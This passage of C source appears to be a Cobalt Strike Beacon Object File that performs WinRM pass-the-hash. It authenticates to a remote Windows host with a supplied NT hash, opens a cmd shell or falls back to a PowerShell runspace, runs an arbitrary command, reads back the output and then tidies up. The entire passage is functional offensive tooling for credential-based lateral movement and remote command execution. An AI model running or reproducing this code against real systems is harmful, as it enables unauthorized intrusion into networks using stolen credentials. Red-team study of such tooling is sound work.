    HINTERNET hReq2 = wsman_post(hConnect, authHdr3, &ntlmSession,
        createSoap, (DWORD)MSVCRT$strlen(createSoap),
        &resp2, &resp2Len, &status2);
    heap_free(createSoap);

    if (!hReq2) {
        BeaconPrintf(CALLBACK_ERROR, "Type3/CreateShell POST failed: %d",
            KERNEL32$GetLastError());
        if (resp2) heap_free(resp2);
        goto cleanup_http;
    }

    if (status2 == 401) {
        BeaconPrintf(CALLBACK_ERROR,
            "Authentication failed (401). Check NT hash/username/domain.");
        if (resp2) heap_free(resp2);
        WINHTTP$WinHttpCloseHandle(hReq2);
        goto cleanup_http;
    }

    /* -----------------------------------------------------------
     * Decide text-shell or PSRP fallback.
     *
     * Try text shell first.  Retry with PSRP only after a
     * protected, successfully verified AccessDenied fault.
     * Never retry on 401, malformed MIME, bad NTLM signatures,
     * missing session state, or a transport failure.
     * ----------------------------------------------------------- */

    BOOL tryPsrp = FALSE;

    if (status2 != 200) {
        if (status2 != 401 && resp2 &&
            wsman_is_access_denied(resp2)) {
            BeaconPrintf(CALLBACK_OUTPUT,
                "[*] Text shell access denied; trying PowerShell backend");
            tryPsrp = TRUE;
        } else if (status2 == 401) {
            BeaconPrintf(CALLBACK_ERROR,
                "Authentication failed (401). "
                "Check NT hash/username/domain.");
        } else {
            print_http_fault("CreateShell", status2, resp2, resp2Len);
        }
        if (resp2) heap_free(resp2);
        WINHTTP$WinHttpCloseHandle(hReq2);
        if (!tryPsrp) goto cleanup_http;
    }

    /* -----------------------------------------------------------
     * Text command shell lifecycle.
     * ----------------------------------------------------------- */

    if (!tryPsrp) {
        char shellId[128];
        MSVCRT$memset(shellId, 0, sizeof(shellId));
        if (!extract_shell_id(resp2, shellId, sizeof(shellId))) {
            BeaconPrintf(CALLBACK_ERROR,
                "Failed to extract ShellId from response");
            if (resp2) heap_free(resp2);
            WINHTTP$WinHttpCloseHandle(hReq2);
            goto cleanup_http;
        }
        if (resp2) heap_free(resp2);
        WINHTTP$WinHttpCloseHandle(hReq2);

        BeaconPrintf(CALLBACK_OUTPUT,
            "[+] Shell created (cmd): %s", shellId);

        char *cmdSoap = build_soap_command(targetUrl, shellId, cmdN,
                                           timeoutSec);
        if (!cmdSoap) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to build Command SOAP");
            goto cleanup_cmd_shell;
        }

        char *resp3 = NULL;
        DWORD resp3Len = 0, status3 = 0;
        HINTERNET hReq3 = wsman_post(hConnect, NULL, &ntlmSession,
            cmdSoap, (DWORD)MSVCRT$strlen(cmdSoap),
            &resp3, &resp3Len, &status3);
        heap_free(cmdSoap);

        if (!hReq3 || status3 != 200) {
            BeaconPrintf(CALLBACK_ERROR,
                "RunCommand failed (HTTP %d)", status3);
            if (resp3) heap_free(resp3);
            if (hReq3) WINHTTP$WinHttpCloseHandle(hReq3);
            goto cleanup_cmd_shell;
        }

        char cmdId[128];
        MSVCRT$memset(cmdId, 0, sizeof(cmdId));
        if (!extract_command_id(resp3, cmdId, sizeof(cmdId))) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to extract CommandId");
            if (resp3) heap_free(resp3);
            WINHTTP$WinHttpCloseHandle(hReq3);
            goto cleanup_cmd_shell;
        }
        if (resp3) heap_free(resp3);
        WINHTTP$WinHttpCloseHandle(hReq3);

        int maxIter = 50;
        while (maxIter-- > 0) {
            char *recvSoap = build_soap_receive(targetUrl, shellId, cmdId,
                timeoutSec, CMD_RESOURCE_URI, "stdout stderr");
            if (!recvSoap) break;

            char *resp4 = NULL;
            DWORD resp4Len = 0, status4 = 0;
            HINTERNET hReq4 = wsman_post(hConnect, NULL, &ntlmSession,
                recvSoap, (DWORD)MSVCRT$strlen(recvSoap),
                &resp4, &resp4Len, &status4);
            heap_free(recvSoap);

            if (!hReq4 || status4 != 200) {
                if (resp4) heap_free(resp4);
                if (hReq4) WINHTTP$WinHttpCloseHandle(hReq4);
                break;
            }

            extract_stream_output(resp4);

            BOOL done = check_command_done(resp4);
            heap_free(resp4);
            WINHTTP$WinHttpCloseHandle(hReq4);

            if (done) break;
        }

        {
            char *sigSoap = build_soap_signal(targetUrl, shellId, cmdId,
                timeoutSec, CMD_RESOURCE_URI);
            if (sigSoap) {
                char *r = NULL; DWORD rLen = 0, st = 0;
                HINTERNET h = wsman_post(hConnect, NULL, &ntlmSession,
                    sigSoap, (DWORD)MSVCRT$strlen(sigSoap),
                    &r, &rLen, &st);
                heap_free(sigSoap);
                if (r) heap_free(r);
                if (h) WINHTTP$WinHttpCloseHandle(h);
            }
        }

    cleanup_cmd_shell:
        {
            char *delSoap = build_soap_delete(targetUrl, shellId,
                timeoutSec, CMD_RESOURCE_URI);
            if (delSoap) {
                char *r = NULL; DWORD rLen = 0, st = 0;
                HINTERNET h = wsman_post(hConnect, NULL, &ntlmSession,
                    delSoap, (DWORD)MSVCRT$strlen(delSoap),
                    &r, &rLen, &st);
                heap_free(delSoap);
                if (r) heap_free(r);
                if (h) WINHTTP$WinHttpCloseHandle(h);
            }
        }

        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] WinRM PTH complete (backend: cmd)");
        goto cleanup_http;
    }

    /* -----------------------------------------------------------
     * PowerShell backend lifecycle.
     *
     * The NTLM session is still valid after the text-shell
     * AccessDenied -- the server authenticated us but denied
     * shell/cmd.  The signing/sealing keys remain on the same
     * underlying connection.
     * ----------------------------------------------------------- */

    {
        BYTE psRpid[16], psPid[16];
        char psShellId[128];
        char psCmdId[128];
        MSVCRT$memset(psShellId, 0, sizeof(psShellId));
        MSVCRT$memset(psCmdId,   0, sizeof(psCmdId));

        /* Generate RunspacePool and Pipeline GUIDs. */
        ADVAPI32$SystemFunction036(psRpid, 16);
        ADVAPI32$SystemFunction036(psPid,  16);

        /* -- PSRP CreateShell ---------------------------------- */
        char *psCreateSoap = build_soap_create_ps_shell(
            targetUrl, timeoutSec, psRpid);
        if (!psCreateSoap) {
            BeaconPrintf(CALLBACK_ERROR,
                "Failed to build PSRP CreateShell SOAP");
            goto cleanup_http;
        }

        char *psResp2 = NULL;
        DWORD psResp2Len = 0, psStatus2 = 0;
        HINTERNET psReq2 = wsman_post(hConnect, NULL, &ntlmSession,
            psCreateSoap, (DWORD)MSVCRT$strlen(psCreateSoap),
            &psResp2, &psResp2Len, &psStatus2);
        heap_free(psCreateSoap);

        if (!psReq2) {
            BeaconPrintf(CALLBACK_ERROR,
                "PSRP CreateShell POST failed: %d",
                KERNEL32$GetLastError());
            if (psResp2) heap_free(psResp2);
            goto cleanup_http;
        }

        if (psStatus2 == 401) {
            BeaconPrintf(CALLBACK_ERROR,
                "PSRP shell creation returned 401. "
                "The underlying connection may have changed; "
                "re-authentication is needed.");
            if (psResp2) heap_free(psResp2);
            WINHTTP$WinHttpCloseHandle(psReq2);
            goto cleanup_http;
        }

        if (psStatus2 != 200) {
            print_http_fault("PSRP CreateShell", psStatus2,
                             psResp2, psResp2Len);
            if (psResp2) heap_free(psResp2);
            WINHTTP$WinHttpCloseHandle(psReq2);
            goto cleanup_http;
        }

        if (!extract_shell_id(psResp2, psShellId, sizeof(psShellId))) {
            BeaconPrintf(CALLBACK_ERROR,
                "Failed to extract PSRP ShellId from response");
            if (psResp2) heap_free(psResp2);
            WINHTTP$WinHttpCloseHandle(psReq2);
            goto cleanup_http;
        }

        if (psResp2) heap_free(psResp2);
        WINHTTP$WinHttpCloseHandle(psReq2);

        BeaconPrintf(CALLBACK_OUTPUT,
            "[+] Shell created (PowerShell): %s", psShellId);

        /* -- PSRP init Receive (drain RunspacePool messages) --- */
        {
            char *initRecvSoap = build_soap_receive(
                targetUrl, psShellId, NULL,
                timeoutSec, PS_RESOURCE_URI, "stdout");
            if (initRecvSoap) {
                char *initResp = NULL;
                DWORD initRespLen = 0, initStatus = 0;
                HINTERNET initReq = wsman_post(hConnect, NULL,
                    &ntlmSession,
                    initRecvSoap, (DWORD)MSVCRT$strlen(initRecvSoap),
                    &initResp, &initRespLen, &initStatus);
                heap_free(initRecvSoap);
                if (!initReq || initStatus != 200) {
                    print_http_fault("PSRP init Receive",
                        initStatus, initResp, initRespLen);
                    if (initResp) heap_free(initResp);
                    if (initReq) WINHTTP$WinHttpCloseHandle(initReq);
                    goto cleanup_ps_shell;
                }
                extract_psrp_stream_output(initResp);
                heap_free(initResp);
                WINHTTP$WinHttpCloseHandle(initReq);
            }
        }

        /* -- PSRP Command (CREATE_PIPELINE) -------------------- */
        char *psCmdSoap = build_soap_ps_command(
            targetUrl, psShellId, cmdN, timeoutSec, psRpid, psPid);
        if (!psCmdSoap) {
            BeaconPrintf(CALLBACK_ERROR,
                "Failed to build PSRP Command SOAP");
            goto cleanup_ps_shell;
        }

        char *psResp3 = NULL;
        DWORD psResp3Len = 0, psStatus3 = 0;
        HINTERNET psReq3 = wsman_post(hConnect, NULL, &ntlmSession,
            psCmdSoap, (DWORD)MSVCRT$strlen(psCmdSoap),
            &psResp3, &psResp3Len, &psStatus3);
        heap_free(psCmdSoap);

        if (!psReq3 || psStatus3 != 200) {
            print_http_fault("PSRP Command", psStatus3,
                             psResp3, psResp3Len);
            if (psResp3) heap_free(psResp3);
            if (psReq3) WINHTTP$WinHttpCloseHandle(psReq3);
            goto cleanup_ps_shell;
        }

        if (!extract_command_id(psResp3, psCmdId, sizeof(psCmdId))) {
            BeaconPrintf(CALLBACK_ERROR,
                "Failed to extract PSRP CommandId");
            if (psResp3) heap_free(psResp3);
            WINHTTP$WinHttpCloseHandle(psReq3);
            goto cleanup_ps_shell;
        }
        if (psResp3) heap_free(psResp3);
        WINHTTP$WinHttpCloseHandle(psReq3);

        /* -- PSRP Receive loop --------------------------------- */
        int psMaxIter = 50;
        while (psMaxIter-- > 0) {
            char *psRecvSoap = build_soap_receive(
                targetUrl, psShellId, psCmdId,
                timeoutSec, PS_RESOURCE_URI, "stdout");
            if (!psRecvSoap) break;

            char *psResp4 = NULL;
            DWORD psResp4Len = 0, psStatus4 = 0;
            HINTERNET psReq4 = wsman_post(hConnect, NULL, &ntlmSession,
                psRecvSoap, (DWORD)MSVCRT$strlen(psRecvSoap),
                &psResp4, &psResp4Len, &psStatus4);
            heap_free(psRecvSoap);

            if (!psReq4 || psStatus4 != 200) {
                if (psResp4 && psResp4Len > 0) {
                    print_http_fault("PSRP Receive", psStatus4,
                                     psResp4, psResp4Len);
                } else {
                    BeaconPrintf(CALLBACK_ERROR,
                        "PSRP Receive failed: HTTP %lu", psStatus4);
                }
                if (psResp4) heap_free(psResp4);
                if (psReq4) WINHTTP$WinHttpCloseHandle(psReq4);
                break;
            }

            /* Parse PSRP fragments from stream data. */
            int psState = extract_psrp_stream_output(psResp4);

            BOOL done = check_command_done(psResp4);
            heap_free(psResp4);
            WINHTTP$WinHttpCloseHandle(psReq4);

            /* Pipeline terminal state or WSMan CommandState/Done. */
            if (done || psState == PSRP_PS_COMPLETED ||
                psState == PSRP_PS_STOPPED ||
                psState == PSRP_PS_FAILED)
                break;
        }

        /* -- PSRP Signal -------------------------------------- */
        {
            char *sigSoap = build_soap_signal(targetUrl, psShellId,
                psCmdId, timeoutSec, PS_RESOURCE_URI);
            if (sigSoap) {
                char *r = NULL; DWORD rLen = 0, st = 0;
                HINTERNET h = wsman_post(hConnect, NULL, &ntlmSession,
                    sigSoap, (DWORD)MSVCRT$strlen(sigSoap),
                    &r, &rLen, &st);
                heap_free(sigSoap);
                if (r) heap_free(r);
                if (h) WINHTTP$WinHttpCloseHandle(h);
            }
        }

    cleanup_ps_shell:
        /* -- PSRP Delete -------------------------------------- */
        {
            char *delSoap = build_soap_delete(targetUrl, psShellId,
                timeoutSec, PS_RESOURCE_URI);
            if (delSoap) {
                char *r = NULL; DWORD rLen = 0, st = 0;
                HINTERNET h = wsman_post(hConnect, NULL, &ntlmSession,
                    delSoap, (DWORD)MSVCRT$strlen(delSoap),
                    &r, &rLen, &st);
                heap_free(delSoap);
                if (r) heap_free(r);
                if (h) WINHTTP$WinHttpCloseHandle(h);
            }
        }

        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] WinRM PTH complete (backend: PowerShell)");
    }

cleanup_http:
    if (hConnect) WINHTTP$WinHttpCloseHandle(hConnect);
    if (hSession) WINHTTP$WinHttpCloseHandle(hSession);

    if (targetN)   heap_free(targetN);
    if (usernameN) heap_free(usernameN);
    if (domainN)   heap_free(domainN);
    if (cmdN)      heap_free(cmdN);
    if (targetUrl) heap_free(targetUrl);
    if (authHdr1)  heap_free(authHdr1);
    secure_heap_free(authHdr3, 4096 * sizeof(WCHAR));
    secure_heap_free(rawArgs, sizeof(*rawArgs));
    secure_zero(ntHashBytes, sizeof(ntHashBytes));
    secure_zero(lmResp, sizeof(lmResp));
    secure_zero(sessionBaseKey, sizeof(sessionBaseKey));
    secure_zero(exportedSessionKey, sizeof(exportedSessionKey));
    secure_zero(encSessKey, sizeof(encSessKey));
    secure_zero(&ntlmSession, sizeof(ntlmSession));
}
